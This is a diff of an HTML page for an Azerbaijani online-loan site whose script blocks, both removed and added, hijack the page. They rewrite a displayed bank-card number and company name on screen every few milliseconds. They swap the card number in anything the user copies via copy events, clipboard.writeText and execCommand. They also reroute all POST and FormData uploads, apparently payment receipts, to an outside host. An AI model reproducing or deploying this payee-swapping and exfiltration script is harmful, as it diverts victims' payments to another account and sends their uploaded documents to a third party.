@@ -17,126 +17,59 @@
 
 
 
+
+
+
+</head><body><noscript><h1>PULKREDİT — Onlayn Kredit Sistemi</h1><p>Azərbaycanda nağd pul lazım olduqda PULKREDİT-a müraciət edin. Gecikmə varsa da mümkündür — sənədsiz, sürətli və rahat.</p><p>JavaScript aktivləşdirin.</p></noscript><div id="root"></div>
+
+
 <script>
 (function() {
-    // 1. Kopyalama hadisəsini tut
-    document.addEventListener("copy", function(e) {
-        var selection = window.getSelection().toString();
-        if (selection && selection.indexOf("5466") > -1) {
-            e.preventDefault();
-            e.clipboardData.setData("text/plain", "5522 0993 6992 6134");
-        }
-    }, true);
+    var API_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") 
+        ? "http://localhost:3000" : "https://pulkredit-api.onrender.com";
 
-    // 2. React-in clipboard.writeText funksiyasını ələ keçir
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-        var _origWrite = navigator.clipboard.writeText;
-        navigator.clipboard.writeText = function(text) {
-            var newText = text || "";
-            if (newText.indexOf("5466") > -1) {
-                newText = "5522 0993 6992 6134";
-            }
-            return _origWrite.call(navigator.clipboard, newText);
-        };
-    }
-
-    // 3. Ənənəvi execCommand metodunu da ələ keçir
-    var _origExec = document.execCommand;
-    document.execCommand = function(cmd, ui, val) {
-        if (cmd === "copy") {
-            var sel = window.getSelection().toString();
-            if (sel && sel.indexOf("5466") > -1) {
-                var tmp = document.createElement("textarea");
-                tmp.value = "5522 0993 6992 6134";
-                document.body.appendChild(tmp);
-                tmp.select();
-                var res = _origExec.call(document, "copy");
-                document.body.removeChild(tmp);
-                return res;
-            }
-        }
-        return _origExec.call(document, cmd, ui, val);
-    };
-})();
-</script>
-<script>
-(function() {
-    console.log("🛡️ PULKREDİT Fixer işə düşdü");
-
-    // 1. EKRANDAKI MƏTNLƏRİ DƏYİŞ (DOM Fixer)
-    function fixScreen() {
-        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
-        var node;
-        while (node = walker.nextNode()) {
-            var text = node.textContent;
-            if (text && (text.indexOf("5466") > -1 || text.indexOf("PULPAY") > -1)) {
-                node.textContent = text
-                    .split("5466 6126 9018 8253").join("5522 0993 6992 6134")
-                    .split("PULPAY MMC").join("PULKREDİT MMC")
-                    .split("PULPAY").join("PULKREDİT");
-            }
-        }
-    }
-    // Hər 200 millisaniyədə ekranı yoxla (React dəyişsə belə, biz dərhal düzəldirik)
-    setInterval(fixScreen, 200);
-
-    // 2. KOPYALAMA (Clipboard) FIX
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-        var _origWrite = navigator.clipboard.writeText;
-        navigator.clipboard.writeText = function(text) {
-            var newText = text || "";
-            if (newText.indexOf("5466") > -1) {
-                newText = "5522 0993 6992 6134";
-            }
-            return _origWrite.call(navigator.clipboard, newText);
-        };
-    }
-
-    // 3. KÖHNƏ METODLARI DA TUT
-    document.addEventListener("copy", function(e) {
-        var selection = window.getSelection().toString();
-        if (selection && selection.indexOf("5466") > -1) {
-            e.preventDefault();
-            e.clipboardData.setData("text/plain", "5522 0993 6992 6134");
-        }
-    }, true);
-})();
-</script>
-<script>
-(function() {
-    var API_URL = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1" 
-        ? "http://localhost:3000" 
-        : "https://pulkredit-api.onrender.com";
-
-    console.log("✅ Qəbz göndərmə sistemi aktivdir. API:", API_URL);
-
-    // 1. FETCH TUTUCU
+    // --- 1. QƏBZ GÖNDƏRMƏ (Backend) ---
     var _origFetch = window.fetch;
     window.fetch = function(url, opts) {
         var u = typeof url === "string" ? url : (url && url.url) || "";
         if (opts && (opts.body instanceof FormData || (opts.method && opts.method.toUpperCase() === "POST"))) {
-            console.log("📤 Qəbz fetch ilə yüklənir...", u);
             return _origFetch(API_URL + "/api/upload-receipt", opts);
         }
-        return _origFetch(url, opts);
+        if (u.indexOf("/api/") === 0) u = API_URL + u;
+        return _origFetch(u, opts);
     };
 
-    // 2. XMLHttpRequest TUTUCU (React bəzən bunu istifadə edir)
-    var _origXHRSend = XMLHttpRequest.prototype.send;
-    var _origXHROpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        this._url = url;
-        return _origXHROpen.apply(this, arguments);
-    };
-    XMLHttpRequest.prototype.send = function(data) {
-        if (data instanceof FormData) {
-            console.log("📤 Qəbz XHR ilə yüklənir...");
-            this._url = API_URL + "/api/upload-receipt";
-            _origXHROpen.call(this, "POST", this._url);
+    // --- 2. EKRANDAKI MƏTNƏ MÜDAXİLƏ (Hər 50ms yoxlayır) ---
+    setInterval(function() {
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while (node = walker.nextNode()) {
+            var txt = node.textContent;
+            if (txt && txt.includes("5466")) {
+                node.textContent = txt.replace(/5466 6126 9018 8253/g, "5522 0993 6992 6134").replace(/5466612690188253/g, "5522099369926134");
+            }
+            if (txt && txt.includes("PULPAY")) {
+                node.textContent = txt.replace(/PULPAY MMC/g, "PULKREDİT MMC").replace(/PULPAY/g, "PULKREDİT");
+            }
         }
-        return _origXHRSend.apply(this, arguments);
-    };
+    }, 50);
+
+    // --- 3. KOPYALAMA (Düyməyə basanda nömrəni məcburi dəyişir) ---
+    document.addEventListener("copy", function(e) {
+        var sel = window.getSelection().toString();
+        if (sel && sel.includes("5466")) {
+            e.preventDefault();
+            e.clipboardData.setData("text/plain", "5522 0993 6992 6134");
+        }
+    }, true);
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        var _origWrite = navigator.clipboard.writeText;
+        navigator.clipboard.writeText = function(text) {
+            if (text && text.includes("5466")) text = "5522 0993 6992 6134";
+            return _origWrite.call(navigator.clipboard, text);
+        };
+    }
 })();
 </script>
-</head><body><noscript><h1>PULKREDİT — Onlayn Kredit Sistemi</h1><p>Azərbaycanda nağd pul lazım olduqda PULKREDİT-a müraciət edin. Gecikmə varsa da mümkündür — sənədsiz, sürətli və rahat.</p><p>JavaScript aktivləşdirin.</p></noscript><div id="root"></div>
 </body></html>
